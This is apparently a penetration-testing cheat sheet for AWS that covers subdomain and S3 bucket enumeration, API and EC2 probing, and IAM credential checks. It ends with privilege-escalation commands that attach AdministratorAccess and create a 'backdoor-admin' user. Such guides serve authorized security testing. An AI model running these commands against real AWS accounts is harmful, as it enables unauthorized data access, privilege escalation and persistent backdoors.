# AWSinitialenum

## Check source code for bucket names and creds.

🔍 Phase 1: Reconnaissance (0-4 Hours)

Objective: Gather intelligence about AWS resources, identify attack surfaces, and build a target map before engaging in active attacks.


---

🛠️ Step 1: Identify Publicly Exposed AWS Resources

Since this is a black-box test, you have no credentials to start. Your first goal is to find anything publicly accessible. AWS often leaks S3 Buckets, EC2 instances, CloudFront distributions, and API gateways.

You will use a combination of OSINT, subdomain enumeration, and API scraping to map out AWS services.


---

🔹 1.1 Enumerate Subdomains (Possible AWS Services)

AWS-hosted resources often use subdomains that leak information.
To identify S3 buckets, CloudFront instances, or API Gateways, enumerate subdomains.

🛠️ Commands for Subdomain Discovery:

(1) Passive Enumeration (OSINT)

# Use Amass for subdomain enumeration
amass enum -passive -d target.com

# Use Subfinder for additional enumeration
subfinder -d target.com -o subdomains.txt

What this does:

Finds subdomains associated with target.com that might host AWS services.

Look for patterns like s3.target.com, api.target.com, cdn.target.com, uploads.target.com.



---

(2) Active Subdomain Enumeration

# Bruteforce subdomains using Gobuster
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster_results.txt

# Check for wildcard DNS (if all subdomains resolve, bruteforcing may be useless)
dig +short wildcard.target.com

What this does:

Tries 5,000 common subdomains to find hidden AWS resources.

CloudFront/CDN-related subdomains can point to leaked private storage or admin portals.



---

🔹 1.2 Identify Public S3 Buckets

S3 Buckets are one of the most common misconfigurations in AWS pentests. If public, they may contain sensitive files, credentials, or even flags.

🛠️ Commands to Find Public S3 Buckets:

(1) Check for S3 Buckets Using Common Naming Conventions

# Manually check bucket names using AWS CLI (without credentials)
aws s3 ls s3://target-bucket --no-sign-request

# Bruteforce bucket names
s3scanner -b targetcompany -t 10 --no-sign-request

# Use Google Dorking to find exposed buckets
site:s3.amazonaws.com inurl:target
site:target.s3.amazonaws.com

What this does:

Checks if s3://target-bucket is publicly readable.

Common bucket names: uploads.target.com, backup.target, cdn.target.com.


(2) Enumerate Bucket Files (If Found)

aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/sensitive.txt .
cat sensitive.txt

What this does:

Lists all files inside a public bucket.

If readable, try to download configuration files, database dumps, or credentials.



---

🔹 1.3 Enumerate AWS API Gateways

API Gateways often expose AWS Lambda functions, DynamoDB, or sensitive endpoints.

🛠️ Commands to Find AWS API Gateways:

(1) Identify API Endpoints via Passive OSINT

# Search for AWS API Gateway subdomains
gau target.com | grep -E "execute-api|amazonaws"

(2) Probe API Endpoints

# Check for AWS API responses
curl -i https://api.target.com
curl -i https://api.target.com/v1/user
curl -i https://target.execute-api.us-east-1.amazonaws.com

What this does:

Looks for AWS API Gateway endpoints (which could expose Lambda functions).

Look for leaks: If the API responds with "message": "Unauthorized", you may be able to bypass authentication.



---

🔹 1.4 Identify AWS EC2 Instances

AWS EC2 instances can expose SSH, RDP, or web apps.

🛠️ Commands to Identify EC2 Instances:

(1) Reverse Lookup AWS IP Ranges

curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq -r '.prefixes[] | select(.region=="us-east-1") | .ip_prefix'

(2) Scan for Exposed EC2 Hosts

nmap -Pn -p 22,80,443,3306 --script=vulners target-ip

What this does:

Finds exposed EC2 servers running SSH, databases, or web services.

Checks for common vulnerabilities.



---

🛠️ Step 2: Identify Misconfigured IAM & Permissions

Once you find credentials (e.g., in an S3 bucket, API keys, or code repos), you need to enumerate IAM permissions.

🔹 2.1 Identify AWS Users and Their Permissions

Assume you found valid AWS keys. The first step is to check what they can access.

🛠️ Commands to Validate AWS Credentials:

(1) Check If AWS Keys Work

aws sts get-caller-identity

(2) List Users & Roles

aws iam list-users
aws iam list-roles
aws iam get-user

(3) Enumerate Policies (Check What You Can Access)

aws iam list-attached-user-policies --user-name <target-user>
aws iam list-policies --query "Policies[*].PolicyName"

(4) Look for Privilege Escalation Paths

aws iam list-roles --query 'Roles[*].[RoleName, AssumeRolePolicyDocument]'
aws iam get-role --role-name <target-role>

What this does:

Identifies who you are and what permissions you have.

Checks if you can assume higher privileges via sts:AssumeRole.



---

🔹 2.2 Look for Misconfigured IAM Permissions

If the IAM policies allow assume-role, you may be able to escalate privileges.

🛠️ Commands to Try Privilege Escalation:

(1) Check If You Can Assume a Higher Role

aws sts assume-role --role-arn arn:aws:iam::account-id:role/AdminRole --role-session-name pentest-session

(2) Attach Administrator Access to Yourself

aws iam attach-user-policy --user-name target-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

(3) Create a New User & Add Admin Permissions

aws iam create-user --user-name backdoor-admin
aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

What this does:

If the target IAM is misconfigured, you can escalate to full admin.

Look for AWS IAM roles that allow sts:AssumeRole.
